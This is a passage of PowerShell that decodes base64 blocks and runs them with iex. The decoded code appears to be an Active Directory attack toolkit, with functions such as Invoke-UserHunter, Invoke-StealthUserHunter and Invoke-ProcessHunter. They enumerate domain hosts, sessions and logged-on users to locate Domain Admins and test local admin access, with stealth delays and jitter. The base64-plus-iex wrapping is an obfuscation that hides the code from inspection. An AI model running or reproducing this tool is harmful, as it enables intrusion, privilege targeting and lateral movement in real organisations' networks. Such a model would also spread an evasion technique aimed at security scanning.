BGb3JFYWNoLU9iamVjdCB7JF8uUmVtb3RlU2VydmVyTmFtZX0KICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgaWYgKCgkU3RlYWx0aFNvdXJjZSAtZXEgIkRDIikgLW9yICgkU3RlYWx0aFNvdXJjZSAtZXEgIkFsbCIpKSB7CiAgICAgICAgICAgICAgICAgICAgICAgIFdyaXRlLVZlcmJvc2UgIlsqXSBRdWVyeWluZyBkb21haW4gJERvbWFpbiBmb3IgRG9tYWluIENvbnRyb2xsZXJzLi4uIgogICAgICAgICAgICAgICAgICAgICAgICAkQ29tcHV0ZXJOYW1lICs9IEdldC1OZXREb21haW5Db250cm9sbGVyIC1MREFQIC1Eb21haW4gJERvbWFpbiAtRG9tYWluQ29udHJvbGxlciAkRG9tYWluQ29udHJvbGxlciB8IEZvckVhY2gtT2JqZWN0IHsgJF8uZG5zaG9zdG5hbWV9CiAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgfQogICAgICAgICAgICB9CiAgICAgICAgICAgIGVsc2UgewogICAgICAgICAgICAgICAgRm9yRWFjaCAoJERvbWFpbiBpbiAkVGFyZ2V0RG9tYWlucykgewogICAgICAgICAgICAgICAgICAgIFdyaXRlLVZlcmJvc2UgIlsqXSBRdWVyeWluZyBkb21haW4gJERvbWFpbiBmb3IgaG9zdHMiCiAgICAgICAgICAgICAgICAgICAgJEFyZ3VtZW50cyA9IEB7CiAgICAgICAgICAgICAgICAgICAgICAgICdEb21haW4nID0gJERvbWFpbgogICAgICAgICAgICAgICAgICAgICAgICAnRG9tYWluQ29udHJvbGxlcicgPSAkRG9tYWluQ29udHJvbGxlcgogICAgICAgICAgICAgICAgICAgICAgICAnQURTcGF0aCcgPSAkQURTcGF0aAogICAgICAgICAgICAgICAgICAgICAgICAnRmlsdGVyJyA9ICRDb21wdXRlckZpbHRlcgogICAgICAgICAgICAgICAgICAgICAgICAnVW5jb25zdHJhaW5lZCcgPSAkVW5jb25zdHJhaW5lZAogICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICAkQ29tcHV0ZXJOYW1lICs9IEdldC1OZXRDb21wdXRlciBAQXJndW1lbnRzCiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgIH0KICAgICAgICAgICAgJENvbXB1dGVyTmFtZSA9ICRDb21wdXRlck5hbWUgfCBXaGVyZS1PYmplY3QgeyAkXyB9IHwgU29ydC1PYmplY3QgLVVuaXF1ZSB8IFNvcnQtT2JqZWN0IHsgR2V0LVJhbmRvbSB9CiAgICAgICAgICAgIGlmKCQoJENvbXB1dGVyTmFtZS5Db3VudCkgLWVxIDApIHsKICAgICAgICAgICAgICAgIHRocm93ICJObyBob3N0cyBmb3VuZCEiCiAgICAgICAgICAgIH0KICAgICAgICB9CiAgICAgICAgJFRhcmdldFVzZXJzID0gQCgpCiAgICAgICAgJEN1cnJlbnRVc2VyID0gKFtFbnZpcm9ubWVudF06OlVzZXJOYW1lKS50b0xvd2VyKCkKICAgICAgICBpZigkU2hvd0FsbCAtb3IgJEZvcmVpZ25Vc2VycykgewogICAgICAgICAgICAkVXNlciA9IE5ldy1PYmplY3QgUFNPYmplY3QKICAgICAgICAgICAgJFVzZXIgfCBBZGQtTWVtYmVyIE5vdGVwcm9wZXJ0eSAnTWVtYmVyRG9tYWluJyAkTnVsbAogICAgICAgICAgICAkVXNlciB8IEFkZC1NZW1iZXIgTm90ZXByb3BlcnR5ICdNZW1iZXJOYW1lJyAnKicKICAgICAgICAgICAgJFRhcmdldFVzZXJzID0gQCgkVXNlcikKICAgICAgICAgICAgaWYoJEZvcmVpZ25Vc2VycykgewogICAgICAgICAgICAgICAgJGtyYnRndE5hbWUgPSBDb252ZXJ0LUNhbm9uaWNhbHRvTlQ0IC1PYmplY3ROYW1lICJrcmJ0Z3RAJCgkRG9tYWluKSIKICAgICAgICAgICAgICAgICREb21haW5TaG9ydE5hbWUgPSAka3JidGd0TmFtZS5zcGxpdCgiXCIpWzBdCiAgICAgICAgICAgIH0KICAgICAgICB9CiAgICAgICAgZWxzZWlmKCRUYXJnZXRTZXJ2ZXIpIHsKICAgICAgICAgICAgV3JpdGUtVmVyYm9zZSAiUXVlcnlpbmcgdGFyZ2V0IHNlcnZlciAnJFRhcmdldFNlcnZlcicgZm9yIGxvY2FsIHVzZXJzIgogICAgICAgICAgICAkVGFyZ2V0VXNlcnMgPSBHZXQtTmV0TG9jYWxHcm91cCAkVGFyZ2V0U2VydmVyIC1SZWN1cnNlIHwgV2hlcmUtT2JqZWN0IHsoLW5vdCAkXy5Jc0dyb3VwKSAtYW5kICRfLklzRG9tYWluIH0gfCBGb3JFYWNoLU9iamVjdCB7CiAgICAgICAgICAgICAgICAkVXNlciA9IE5ldy1PYmplY3QgUFNPYmplY3QKICAgICAgICAgICAgICAgICRVc2VyIHwgQWRkLU1lbWJlciBOb3RlcHJvcGVydHkgJ01lbWJlckRvbWFpbicgKCRfLkFjY291bnROYW1lKS5zcGxpdCgiLyIpWzBdLnRvTG93ZXIoKSAKICAgICAgICAgICAgICAgICRVc2VyIHwgQWRkLU1lbWJlciBOb3RlcHJvcGVydHkgJ01lbWJlck5hbWUnICgkXy5BY2NvdW50TmFtZSkuc3BsaXQoIi8iKVsxXS50b0xvd2VyKCkgCiAgICAgICAgICAgICAgICAkVXNlcgogICAgICAgICAgICB9ICB8IFdoZXJlLU9iamVjdCB7JF99CiAgICAgICAgfQogICAgICAgIGVsc2VpZigkVXNlck5hbWUpIHsKICAgICAgICAgICAgV3JpdGUtVmVyYm9zZSAiWypdIFVzaW5nIHRhcmdldCB1c2VyICckVXNlck5hbWUnLi4uIgogICAgICAgICAgICAkVXNlciA9IE5ldy1PYmplY3QgUFNPYmplY3QKICAgICAgICAgICAgJFVzZXIgfCBBZGQtTWVtYmVyIE5vdGVwcm9wZXJ0eSAnTWVtYmVyRG9tYWluJyAkVGFyZ2V0RG9tYWluc1swXQogICAgICAgICAgICAkVXNlciB8IEFkZC1NZW1iZXIgTm90ZXByb3BlcnR5ICdNZW1iZXJOYW1lJyAkVXNlck5hbWUuVG9Mb3dlcigpCiAgICAgICAgICAgICRUYXJnZXRVc2VycyA9IEAoJFVzZXIpCiAgICAgICAgfQogICAgICAgIGVsc2VpZigkVXNlckZpbGUpIHsKICAgICAgICAgICAgJFRhcmdldFVzZXJzID0gR2V0LUNvbnRlbnQgLVBhdGggJFVzZXJGaWxlIHwgRm9yRWFjaC1PYmplY3QgewogICAgICAgICAgICAgICAgJFVzZXIgPSBOZXctT2JqZWN0IFBTT2JqZWN0CiAgICAgICAgICAgICAgICAkVXNlciB8IEFkZC1NZW1iZXIgTm90ZXByb3BlcnR5ICdNZW1iZXJEb21haW4nICRUYXJnZXREb21haW5zWzBdCiAgICAgICAgICAgICAgICAkVXNlciB8IEFkZC1NZW1iZXIgTm90ZXByb3BlcnR5ICdNZW1iZXJOYW1lJyAkXwogICAgICAgICAgICAgICAgJFVzZXIKICAgICAgICAgICAgfSAgfCBXaGVyZS1PYmplY3QgeyRffQogICAgICAgIH0KICAgICAgICBlbHNlaWYoJFVzZXJBRFNwYXRoIC1vciAkVXNlckZpbHRlciAtb3IgJEFkbWluQ291bnQpIHsKICAgICAgICAgICAgRm9yRWFjaCAoJERvbWFpbiBpbiAkVGFyZ2V0RG9tYWlucykgewogICAgICAgICAgICAgICAgJEFyZ3VtZW50cyA9IEB7CiAgICAgICAgICAgICAgICAgICAgJ0RvbWFpbicgPSAkRG9tYWluCiAgICAgICAgICAgICAgICAgICAgJ0RvbWFpbkNvbnRyb2xsZXInID0gJERvbWFpbkNvbnRyb2xsZXIKICAgICAgICAgICAgICAgICAgICAnQURTcGF0aCcgPSAkVXNlckFEU3BhdGgKICAgICAgICAgICAgICAgICAgICAnRmlsdGVyJyA9ICRVc2VyRmlsdGVyCiAgICAgICAgICAgICAgICAgICAgJ0FkbWluQ291bnQnID0gJEFkbWluQ291bnQKICAgICAgICAgICAgICAgICAgICAnQWxsb3dEZWxlZ2F0aW9uJyA9ICRBbGxvd0RlbGVnYXRpb24KICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgIFdyaXRlLVZlcmJvc2UgIlsqXSBRdWVyeWluZyBkb21haW4gJERvbWFpbiBmb3IgdXNlcnMiCiAgICAgICAgICAgICAgICAkVGFyZ2V0VXNlcnMgKz0gR2V0LU5ldFVzZXIgQEFyZ3VtZW50cyB8IEZvckVhY2gtT2JqZWN0IHsKICAgICAgICAgICAgICAgICAgICAkVXNlciA9IE5ldy1PYmplY3QgUFNPYmplY3QKICAgICAgICAgICAgICAgICAgICAkVXNlciB8IEFkZC1NZW1iZXIgTm90ZXByb3BlcnR5ICdNZW1iZXJEb21haW4nICREb21haW4KICAgICAgICAgICAgICAgICAgICAkVXNlciB8IEFkZC1NZW1iZXIgTm90ZXByb3BlcnR5ICdNZW1iZXJOYW1lJyAkXy5zYW1hY2NvdW50bmFtZQogICAgICAgICAgICAgICAgICAgICRVc2VyCiAgICAgICAgICAgICAgICB9ICB8IFdoZXJlLU9iamVjdCB7JF99CiAgICAgICAgICAgIH0gICAgICAgICAgICAKICAgICAgICB9CiAgICAgICAgZWxzZSB7CiAgICAgICAgICAgIEZvckVhY2ggKCREb21haW4gaW4gJFRhcmdldERvbWFpbnMpIHsKICAgICAgICAgICAgICAgIFdyaXRlLVZlcmJvc2UgIlsqXSBRdWVyeWluZyBkb21haW4gJERvbWFpbiBmb3IgdXNlcnMgb2YgZ3JvdXAgJyRHcm91cE5hbWUnIgogICAgICAgICAgICAgICAgJFRhcmdldFVzZXJzICs9IEdldC1OZXRHcm91cE1lbWJlciAtR3JvdXBOYW1lICRHcm91cE5hbWUgLURvbWFpbiAkRG9tYWluIC1Eb21haW5Db250cm9sbGVyICREb21haW5Db250cm9sbGVyCiAgICAgICAgICAgIH0KICAgICAgICB9CiAgICAgICAgaWYgKCggKC1ub3QgJFNob3dBbGwpIC1hbmQgKC1ub3QgJEZvcmVpZ25Vc2VycykgKSAtYW5kICgoISRUYXJnZXRVc2VycykgLW9yICgkVGFyZ2V0VXNlcnMuQ291bnQgLWVxIDApKSkgewogICAgICAgICAgICB0aHJvdyAiWyFdIE5vIHVzZXJzIGZvdW5kIHRvIHNlYXJjaCBmb3IhIgogICAgICAgIH0KICAgICAgICAkSG9zdEVudW1CbG9jayA9IHsKICAgICAgICAgICAgcGFyYW0oJENvbXB1dGVyTmFtZSwgJFBpbmcsICRUYXJnZXRVc2VycywgJEN1cnJlbnRVc2VyLCAkU3RlYWx0aCwgJERvbWFpblNob3J0TmFtZSkKICAgICAgICAgICAgJFVwID0gJFRydWUKICAgICAgICAgICAgaWYoJFBpbmcpIHsKICAgICAgICAgICAgICAgICRVcCA9IFRlc3QtQ29ubmVjdGlvbiAtQ291bnQgMSAtUXVpZXQgLUNvbXB1dGVyTmFtZSAkQ29tcHV0ZXJOYW1lCiAgICAgICAgICAgIH0KICAgICAgICAgICAgaWYoJFVwKSB7CiAgICAgICAgICAgICAgICBpZighJERvbWFpblNob3J0TmFtZSkgewogICAgICAgICAgICAgICAgICAgICRTZXNzaW9ucyA9IEdldC1OZXRTZXNzaW9uIC1Db21wdXRlck5hbWUgJENvbXB1dGVyTmFtZQogICAgICAgICAgICAgICAgICAgIEZvckVhY2ggKCRTZXNzaW9uIGluICRTZXNzaW9ucykgewogICAgICAgICAgICAgICAgICAgICAgICAkVXNlck5hbWUgPSAkU2Vzc2lvbi5zZXNpMTBfdXNlcm5hbWUKICAgICAgICAgICAgICAgICAgICAgICAgJENOYW1lID0gJFNlc3Npb24uc2VzaTEwX2NuYW1lCiAgICAgICAgICAgICAgICAgICAgICAgIGlmKCRDTmFtZSAtYW5kICRDTmFtZS5TdGFydHNXaXRoKCJcXCIpKSB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAkQ05hbWUgPSAkQ05hbWUuVHJpbVN0YXJ0KCJcIikKICAgICAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgICAgICBpZiAoKCRVc2VyTmFtZSkgLWFuZCAoJFVzZXJOYW1lLnRyaW0oKSAtbmUgJycpIC1hbmQgKCEoJFVzZXJOYW1lIC1tYXRjaCAkQ3VycmVudFVzZXIpKSkgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgJFRhcmdldFVzZXJzIHwgV2hlcmUtT2JqZWN0IHskVXNlck5hbWUgLWxpa2UgJF8uTWVtYmVyTmFtZX0gfCBGb3JFYWNoLU9iamVjdCB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJElQID0gR2V0LUlQQWRkcmVzcyAtQ29tcHV0ZXJOYW1lICRDb21wdXRlck5hbWUKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAkRm91bmRVc2VyID0gTmV3LU9iamVjdCBQU09iamVjdAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICRGb3VuZFVzZXIgfCBBZGQtTWVtYmVyIE5vdGVwcm9wZXJ0eSAnVXNlckRvbWFpbicgJF8uTWVtYmVyRG9tYWluCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJEZvdW5kVXNlciB8IEFkZC1NZW1iZXIgTm90ZXByb3BlcnR5ICdVc2VyTmFtZScgJFVzZXJOYW1lCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJEZvdW5kVXNlciB8IEFkZC1NZW1iZXIgTm90ZXByb3BlcnR5ICdDb21wdXRlck5hbWUnICRDb21wdXRlck5hbWUKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAkRm91bmRVc2VyIHwgQWRkLU1lbWJlciBOb3RlcHJvcGVydHkgJ0lQJyAkSVAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAkRm91bmRVc2VyIHwgQWRkLU1lbWJlciBOb3RlcHJvcGVydHkgJ1Nlc3Npb25Gcm9tJyAkQ05hbWUKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZiAoJENoZWNrQWNjZXNzKSB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICRBZG1pbiA9IEludm9rZS1DaGVja0xvY2FsQWRtaW5BY2Nlc3MgLUNvbXB1dGVyTmFtZSAkQ05hbWUKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJEZvdW5kVXNlciB8IEFkZC1NZW1iZXIgTm90ZXByb3BlcnR5ICdMb2NhbEFkbWluJyAkQWRtaW4KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZWxzZSB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICRGb3VuZFVzZXIgfCBBZGQtTWVtYmVyIE5vdGVwcm9wZXJ0eSAnTG9jYWxBZG1pbicgJE51bGwKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJEZvdW5kVXNlcgogICAgICAgICAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgICAgICB9ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgaWYoISRTdGVhbHRoKSB7CiAgICAgICAgICAgICAgICAgICAgJExvZ2dlZE9uID0gR2V0LU5ldExvZ2dlZG9uIC1Db21wdXRlck5hbWUgJENvbXB1dGVyTmFtZQogICAgICAgICAgICAgICAgICAgIEZvckVhY2ggKCRVc2VyIGluICRMb2dnZWRPbikgewogICAgICAgICAgICAgICAgICAgICAgICAkVXNlck5hbWUgPSAkVXNlci53a3VpMV91c2VybmFtZQogICAgICAgICAgICAgICAgICAgICAgICAkVXNlckRvbWFpbiA9ICRVc2VyLndrdWkxX2xvZ29uX2RvbWFpbgogICAgICAgICAgICAgICAgICAgICAgICBpZiAoKCRVc2VyTmFtZSkgLWFuZCAoJFVzZXJOYW1lLnRyaW0oKSAtbmUgJycpKSB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAkVGFyZ2V0VXNlcnMgfCBXaGVyZS1PYmplY3QgeyRVc2VyTmFtZSAtbGlrZSAkXy5NZW1iZXJOYW1lfSB8IEZvckVhY2gtT2JqZWN0IHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAkUHJvY2VlZCA9ICRUcnVlCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgaWYoJERvbWFpblNob3J0TmFtZSkgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZiAoJERvbWFpblNob3J0TmFtZS5Ub0xvd2VyKCkgLW5lICRVc2VyRG9tYWluLlRvTG93ZXIoKSkgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJFByb2NlZWQgPSAkVHJ1ZQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGVsc2UgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJFByb2NlZWQgPSAkRmFsc2UKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZigkUHJvY2VlZCkgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAkSVAgPSBHZXQtSVBBZGRyZXNzIC1Db21wdXRlck5hbWUgJENvbXB1dGVyTmFtZQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAkRm91bmRVc2VyID0gTmV3LU9iamVjdCBQU09iamVjdAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAkRm91bmRVc2VyIHwgQWRkLU1lbWJlciBOb3RlcHJvcGVydHkgJ1VzZXJEb21haW4nICRVc2VyRG9tYWluCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICRGb3VuZFVzZXIgfCBBZGQtTWVtYmVyIE5vdGVwcm9wZXJ0eSAnVXNlck5hbWUnICRVc2VyTmFtZQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAkRm91bmRVc2VyIHwgQWRkLU1lbWJlciBOb3RlcHJvcGVydHkgJ0NvbXB1dGVyTmFtZScgJENvbXB1dGVyTmFtZQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAkRm91bmRVc2VyIHwgQWRkLU1lbWJlciBOb3RlcHJvcGVydHkgJ0lQJyAkSVAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJEZvdW5kVXNlciB8IEFkZC1NZW1iZXIgTm90ZXByb3BlcnR5ICdTZXNzaW9uRnJvbScgJE51bGwKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgaWYgKCRDaGVja0FjY2VzcykgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJEFkbWluID0gSW52b2tlLUNoZWNrTG9jYWxBZG1pbkFjY2VzcyAtQ29tcHV0ZXJOYW1lICRDb21wdXRlck5hbWUKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICRGb3VuZFVzZXIgfCBBZGQtTWVtYmVyIE5vdGVwcm9wZXJ0eSAnTG9jYWxBZG1pbicgJEFkbWluCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZWxzZSB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAkRm91bmRVc2VyIHwgQWRkLU1lbWJlciBOb3RlcHJvcGVydHkgJ0xvY2FsQWRtaW4nICROdWxsCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJEZvdW5kVXNlcgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgfQogICAgICAgIH0KICAgIH0KICAgIHByb2Nlc3MgewogICAgICAgIGlmKCRUaHJlYWRzKSB7CiAgICAgICAgICAgIFdyaXRlLVZlcmJvc2UgIlVzaW5nIHRocmVhZGluZyB3aXRoIHRocmVhZHMgPSAkVGhyZWFkcyIKICAgICAgICAgICAgJFNjcmlwdFBhcmFtcyA9IEB7CiAgICAgICAgICAgICAgICAnUGluZycgPSAkKC1ub3QgJE5vUGluZykKICAgICAgICAgICAgICAgICdUYXJnZXRVc2VycycgPSAkVGFyZ2V0VXNlcnMKICAgICAgICAgICAgICAgICdDdXJyZW50VXNlcicgPSAkQ3VycmVudFVzZXIKICAgICAgICAgICAgICAgICdTdGVhbHRoJyA9ICRTdGVhbHRoCiAgICAgICAgICAgICAgICAnRG9tYWluU2hvcnROYW1lJyA9ICREb21haW5TaG9ydE5hbWUKICAgICAgICAgICAgfQogICAgICAgICAgICBJbnZva2UtVGhyZWFkZWRGdW5jdGlvbiAtQ29tcHV0ZXJOYW1lICRDb21wdXRlck5hbWUgLVNjcmlwdEJsb2NrICRIb3N0RW51bUJsb2NrIC1TY3JpcHRQYXJhbWV0ZXJzICRTY3JpcHRQYXJhbXMKICAgICAgICB9CiAgICAgICAgZWxzZSB7CiAgICAgICAgICAgIGlmKC1ub3QgJE5vUGluZyAtYW5kICgkQ29tcHV0ZXJOYW1lLmNvdW50IC1uZSAxKSkgewogICAgICAgICAgICAgICAgJFBpbmcgPSB7cGFyYW0oJENvbXB1dGVyTmFtZSkgaWYoVGVzdC1Db25uZWN0aW9uIC1Db21wdXRlck5hbWUgJENvbXB1dGVyTmFtZSAtQ291bnQgMSAtUXVpZXQgLUVycm9yQWN0aW9uIFN0b3ApeyRDb21wdXRlck5hbWV9fQogICAgICAgICAgICAgICAgJENvbXB1dGVyTmFtZSA9IEludm9rZS1UaHJlYWRlZEZ1bmN0aW9uIC1Ob0ltcG9ydHMgLUNvbXB1dGVyTmFtZSAkQ29tcHV0ZXJOYW1lIC1TY3JpcHRCbG9jayAkUGluZyAtVGhyZWFkcyAxMDAKICAgICAgICAgICAgfQogICAgICAgICAgICBXcml0ZS1WZXJib3NlICJbKl0gVG90YWwgbnVtYmVyIG9mIGFjdGl2ZSBob3N0czogJCgkQ29tcHV0ZXJOYW1lLmNvdW50KSIKICAgICAgICAgICAgJENvdW50ZXIgPSAwCiAgICAgICAgICAgIEZvckVhY2ggKCRDb21wdXRlciBpbiAkQ29tcHV0ZXJOYW1lKSB7CiAgICAgICAgICAgICAgICAkQ291bnRlciA9ICRDb3VudGVyICsgMQogICAgICAgICAgICAgICAgU3RhcnQtU2xlZXAgLVNlY29uZHMgJFJhbmROby5OZXh0KCgxLSRKaXR0ZXIpKiREZWxheSwgKDErJEppdHRlcikqJERlbGF5KQogICAgICAgICAgICAgICAgV3JpdGUtVmVyYm9zZSAiWypdIEVudW1lcmF0aW5nIHNlcnZlciAkQ29tcHV0ZXIgKCRDb3VudGVyIG9mICQoJENvbXB1dGVyTmFtZS5jb3VudCkpIgogICAgICAgICAgICAgICAgJFJlc3VsdCA9IEludm9rZS1Db21tYW5kIC1TY3JpcHRCbG9jayAkSG9zdEVudW1CbG9jayAtQXJndW1lbnRMaXN0ICRDb21wdXRlciwgJEZhbHNlLCAkVGFyZ2V0VXNlcnMsICRDdXJyZW50VXNlciwgJFN0ZWFsdGgsICREb21haW5TaG9ydE5hbWUKICAgICAgICAgICAgICAgICRSZXN1bHQKICAgICAgICAgICAgICAgIGlmKCRSZXN1bHQgLWFuZCAkU3RvcE9uU3VjY2VzcykgewogICAgICAgICAgICAgICAgICAgIFdyaXRlLVZlcmJvc2UgIlsqXSBUYXJnZXQgdXNlciBmb3VuZCwgcmV0dXJuaW5nIGVhcmx5IgogICAgICAgICAgICAgICAgICAgIHJldHVybgogICAgICAgICAgICAgICAgfQogICAgICAgICAgICB9CiAgICAgICAgfQogICAgfQp9Cg==")))iex ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("ZnVuY3Rpb24gSW52b2tlLVN0ZWFsdGhVc2VySHVudGVyIHsKICAgIFtDbWRsZXRCaW5kaW5nKCldCiAgICBwYXJhbSgKICAgICAgICBbUGFyYW1ldGVyKFBvc2l0aW9uPTAsVmFsdWVGcm9tUGlwZWxpbmU9JFRydWUpXQogICAgICAgIFtBbGlhcygnSG9zdHMnKV0KICAgICAgICBbU3RyaW5nW11dCiAgICAgICAgJENvbXB1dGVyTmFtZSwKICAgICAgICBbVmFsaWRhdGVTY3JpcHQoe1Rlc3QtUGF0aCAtUGF0aCAkXyB9KV0KICAgICAgICBbQWxpYXMoJ0hvc3RMaXN0JyldCiAgICAgICAgW1N0cmluZ10KICAgICAgICAkQ29tcHV0ZXJGaWxlLAogICAgICAgIFtTdHJpbmddCiAgICAgICAgJENvbXB1dGVyRmlsdGVyLAogICAgICAgIFtTdHJpbmddCiAgICAgICAgJENvbXB1dGVyQURTcGF0aCwKICAgICAgICBbU3RyaW5nXQogICAgICAgICRHcm91cE5hbWUgPSAnRG9tYWluIEFkbWlucycsCiAgICAgICAgW1N0cmluZ10KICAgICAgICAkVGFyZ2V0U2VydmVyLAogICAgICAgIFtTdHJpbmddCiAgICAgICAgJFVzZXJOYW1lLAogICAgICAgIFtTdHJpbmddCiAgICAgICAgJFVzZXJGaWx0ZXIsCiAgICAgICAgW1N0cmluZ10KICAgICAgICAkVXNlckFEU3BhdGgsCiAgICAgICAgW1ZhbGlkYXRlU2NyaXB0KHtUZXN0LVBhdGggLVBhdGggJF8gfSldCiAgICAgICAgW1N0cmluZ10KICAgICAgICAkVXNlckZpbGUsCiAgICAgICAgW1N3aXRjaF0KICAgICAgICAkQ2hlY2tBY2Nlc3MsCiAgICAgICAgW1N3aXRjaF0KICAgICAgICAkU3RvcE9uU3VjY2VzcywKICAgICAgICBbU3dpdGNoXQogICAgICAgICROb1BpbmcsCiAgICAgICAgW1VJbnQzMl0KICAgICAgICAkRGVsYXkgPSAwLAogICAgICAgIFtEb3VibGVdCiAgICAgICAgJEppdHRlciA9IC4zLAogICAgICAgIFtTdHJpbmddCiAgICAgICAgJERvbWFpbiwKICAgICAgICBbU3dpdGNoXQogICAgICAgICRTaG93QWxsLAogICAgICAgIFtTd2l0Y2hdCiAgICAgICAgJFNlYXJjaEZvcmVzdCwKICAgICAgICBbU3RyaW5nXQogICAgICAgIFtWYWxpZGF0ZVNldCgiREZTIiwiREMiLCJGaWxlIiwiQWxsIildCiAgICAgICAgJFN0ZWFsdGhTb3VyY2UgPSJBbGwiCiAgICApCiAgICBJbnZva2UtVXNlckh1bnRlciAtU3RlYWx0aCBAUFNCb3VuZFBhcmFtZXRlcnMKfQo=")))iex ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("ZnVuY3Rpb24gSW52b2tlLVByb2Nlc3NIdW50ZXIgewogICAgW0NtZGxldEJpbmRpbmcoKV0KICAgIHBhcmFtKAogICAgICAgIFtQYXJhbWV0ZXIoUG9zaXRpb249MCxWYWx1ZUZyb21QaXBlbGluZT0kVHJ1ZSldCiAgICAgICAgW0FsaWFzKCdIb3N0cycpXQogICAgICAgIFtTdHJpbmdbXV0KICAgICAgICAkQ29tcHV0ZXJOYW1lLAogICAgICAgIFtWYWxpZGF0ZVNjcmlwdCh7VGVzdC1QYXRoIC1QYXRoICRfIH0pXQogICAgICAgIFtBbGlhcygnSG9zdExpc3QnKV0KICAgICAgICBbU3RyaW5nXQogICAgICAgICRDb21wdXRlckZpbGUsCiAgICAgICAgW1N0cmluZ10KICAgICAgICAkQ29tcHV0ZXJGaWx0ZXIsCiAgICAgICAgW1N0cmluZ10KICAgICAgICAkQ29tcHV0ZXJBRFNwYXRoLAogICAgICAgIFtTdHJpbmddCiAgICAgICAgJFByb2Nlc3NOYW1lLAogICAgICAgIFtTdHJpbmddCiAgICAgICAgJEdyb3VwTmFtZSA9ICdEb21haW4gQWRtaW5zJywKICAgICAgICBbU3RyaW5nXQogICAgICAgICRUYXJnZXRTZXJ2ZXIsCiAgICAgICAgW1N0cmluZ10KICAgICAgICAkVXNlck5hbWUsCiAgICAgICAgW1N0cmluZ10KICAgICAgICAkVXNlckZpbHRlciwKICAgICAgICBbU3RyaW5nXQogICAgICAgICRVc2VyQURTcGF0aCwKICAgICAgICBbVmFsaWRhdGVTY3JpcHQoe1Rlc3QtUGF0aCAtUGF0aCAkXyB9KV0KICAgICAgICBbU3RyaW5nXQogICAgICAgICRVc2VyRmlsZSwKICAgICAgICBbU3RyaW5nXQogICAgICAgICRSZW1vdGVVc2VyTmFtZSwKICAgICAgICBbU3RyaW5nXQogICAgICAgICRSZW1vdGVQYXNzd29yZCwKICAgICAgICBbU3dpdGNoXQogICAgICAgICRTdG9wT25TdWNjZXNzLAogICAgICAgIFtTd2l0Y2hdCiAgICAgICAgJE5vUGluZywKICAgICAgICBbVUludDMyXQogICAgICAgICREZWxheSA9IDAsCiAgICAgICAgW0RvdWJsZV0KICAgICAgICAkSml0dGVyID0gLjMsCiAgICAgICAgW1N0cmluZ10KICAgICAgICAkRG9tYWluLAogICAgICAgIFtTdHJpbmddCiAgICAgICAgJERvbWFpbkNvbnRyb2xsZXIsCiAgICAgICAgW1N3aXRjaF0KICAgICAgICAkU2hvd0FsbCwKICAgICAgICBbU3dpdGNoXQogICAgICAgICRTZWFyY2hGb3Jlc3QsCiA